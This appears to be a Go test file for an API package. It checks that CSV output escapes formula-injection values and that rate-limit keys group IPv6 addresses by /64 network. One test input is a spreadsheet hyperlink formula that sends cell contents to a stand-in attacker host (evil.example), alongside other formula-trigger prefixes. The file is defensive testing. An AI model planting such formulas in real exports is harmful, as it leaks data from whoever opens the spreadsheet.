package api

import (
	"reflect"
	"testing"
)

func TestCSVRowGuardsEveryCell(t *testing.T) {
	// A scanned site controls the content type as much as the title.
	got := csvRow("https://example.com/", "example.com", "page", "", "verified", "200",
		`=hyperlink("https://evil.example/?"&a1,"x")`, "+cmd", "html", "-1", "@sum(a1)")
	want := []string{"https://example.com/", "example.com", "page", "", "verified", "200",
		`'=hyperlink("https://evil.example/?"&a1,"x")`, "'+cmd", "html", "'-1", "'@sum(a1)"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("csvRow =\n%q\nwant\n%q", got, want)
	}
}

func TestLimitKeyGroupsIPv6ByNetwork(t *testing.T) {
	for in, want := range map[string]string{
		"203.0.113.7":                      "203.0.113.7",
		"::ffff:203.0.113.7":               "203.0.113.7",
		"2001:db8:1:2:aaaa:bbbb:cccc:dddd": "2001:db8:1:2::/64",
		"2001:db8:1:2:1111:2222:3333:4444": "2001:db8:1:2::/64",
		"2001:db8:1:3::1":                  "2001:db8:1:3::/64",
		"fe80::1%eth0":                     "fe80::/64",
		"unknown":                          "unknown",
	} {
		if got := limitKey(in); got != want {
			t.Errorf("limitKey(%q) = %q, want %q", in, got, want)
		}
	}
}
